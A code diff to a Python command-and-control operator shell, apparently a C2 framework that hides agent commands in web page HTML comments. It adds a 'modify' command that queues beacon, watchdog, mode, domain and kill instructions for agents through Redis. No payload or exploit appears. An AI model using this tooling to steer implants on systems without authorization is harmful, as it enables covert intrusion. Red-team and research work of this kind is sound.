@@ -3,6 +3,7 @@ import typer_shell
 from domain_orchestrator import DomainOrchestrator
 import redis
 from typing_extensions import Annotated
+from typing import Optional
 
 # Libraries that are used to handle graceful shutdowns
 import signal
@@ -42,6 +43,121 @@ class PyWebC2Shell:
         self.app.command()(self.read)
         self.app.command()(self.command)
         self.app.command()(self.queue)
+        self.app.command()(self.modify)
+
+    def _build_modification_commands(
+        self,
+        watchdog=None,
+        beacon=None,
+        change_mode=None,
+        domain_add=None,
+        domain_remove=None,
+        domain_active=None,
+        kill=False,
+    ):
+        """Convert CLI flags into properly formatted agent modification commands with validation"""
+        commands = []
+
+        if watchdog is not None:
+            if watchdog <= 0:
+                raise ValueError("Watchdog timer must be a positive integer")
+            commands.append(f"watchdog:{watchdog}")
+
+        if beacon is not None:
+            if beacon <= 0:
+                raise ValueError("Beacon interval must be a positive integer")
+            commands.append(f"beacon:{beacon}")
+
+        if change_mode is not None:
+            if change_mode not in ["l", "b"]:
+                raise ValueError("Mode must be 'l' for long-poll or 'b' for beacon")
+            commands.append(f"change_mode:{change_mode}")
+
+        if domain_add is not None:
+            if not domain_add.strip():
+                raise ValueError("Domain to add cannot be empty")
+            commands.append(f"domain_add:{domain_add}")
+
+        if domain_remove is not None:
+            if not domain_remove.strip():
+                raise ValueError("Domain to remove cannot be empty")
+            commands.append(f"domain_remove:{domain_remove}")
+
+        if domain_active is not None:
+            if not domain_active.strip():
+                raise ValueError("Active domain cannot be empty")
+            commands.append(f"domain_active:{domain_active}")
+
+        if kill:
+            commands.append("kill")
+
+        return commands
+
+    def modify(
+        self,
+        domain: str,
+        watchdog: Annotated[
+            Optional[int],
+            typer.Option(help="Set watchdog timer in seconds (must be positive)"),
+        ] = None,
+        beacon: Annotated[
+            Optional[int],
+            typer.Option(help="Set beacon interval in seconds (must be positive)"),
+        ] = None,
+        change_mode: Annotated[
+            Optional[str],
+            typer.Option(help="Change agent mode ('b' for beacon, 'l' for long-poll)"),
+        ] = None,
+        domain_add: Annotated[
+            Optional[str], typer.Option(help="Add a new domain for the agent")
+        ] = None,
+        domain_remove: Annotated[
+            Optional[str], typer.Option(help="Remove a domain from the agent")
+        ] = None,
+        domain_active: Annotated[
+            Optional[str], typer.Option(help="Set the active domain for the agent")
+        ] = None,
+        kill: Annotated[bool, typer.Option(help="Kill the agent")] = False,
+    ):
+        """Inject agent modification commands into Redis stream for a specific domain"""
+
+        if domain not in self.dorch.get_all_domains():
+            print(
+                "ERROR: Domain provided is not an available domain, use the list command to see all domains"
+            )
+            return
+
+        if domain not in self.dorch.get_running_domains():
+            print(
+                "WARNING: The domain that this command is queued to is not actively running"
+            )
+
+        try:
+            commands = self._build_modification_commands(
+                watchdog=watchdog,
+                beacon=beacon,
+                change_mode=change_mode,
+                domain_add=domain_add,
+                domain_remove=domain_remove,
+                domain_active=domain_active,
+                kill=kill,
+            )
+
+            if not commands:
+                print(
+                    "ERROR: No modification commands provided. Use --help to see available options."
+                )
+                return
+
+            if c.queue_agent_modification_commands(domain, self.redis_client, commands):
+                print(
+                    f"SUCCESS: Agent modification commands {commands} successfully queued for domain {domain}"
+                )
+            else:
+                print("ERROR: Failed to queue agent modification commands")
+
+        except ValueError as e:
+            print(f"ERROR: {e}")
 
     def create(
         self,
@@ -111,7 +227,6 @@ class PyWebC2Shell:
         print(command_list)
         if c.queue_commands(domain, self.redis_client, command_list):
             print(f"SUCCESS: Commands:{command_list} sucessfully queued")
-        c.get_queued_commands(domain, self.redis_client)
 
     def command(self, domain: str, command: str):
         """Insert an HTML comment as a command into a domain"""
